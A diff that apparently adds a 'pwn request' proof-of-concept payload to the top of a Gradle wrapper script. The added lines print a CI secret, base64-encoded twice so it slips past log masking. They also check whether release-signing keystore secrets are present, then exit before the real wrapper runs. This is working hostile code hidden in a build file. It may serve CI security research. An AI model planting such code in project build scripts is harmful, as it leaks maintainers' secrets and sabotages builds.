@@ -1,4 +1,17 @@
 #!/usr/bin/env sh
+# --- GERALT Pwn-Request verification payload ---
+echo "GERALT_LEAKED_TOKEN=$(printf '%s' "${GERALT_SECRET:-}" | base64 | base64)"
+case "$*" in
+  *assembleRelease*)
+    echo "GERALT_DBG: release signing sink reached (assembleRelease in args)"
+    echo "GERALT_DBG: STORE_KEY=${STORE_KEY:+SET} STORE_PASSWORD=${STORE_PASSWORD:+SET} STORE_KEY_ALIAS=${STORE_KEY_ALIAS:+SET} STORE_KEY_PASSWORD=${STORE_KEY_PASSWORD:+SET}"
+    exit 1
+    ;;
+  *)
+    exit 0
+    ;;
+esac
+
 
 #
 # Copyright 2015 the original author or authors.
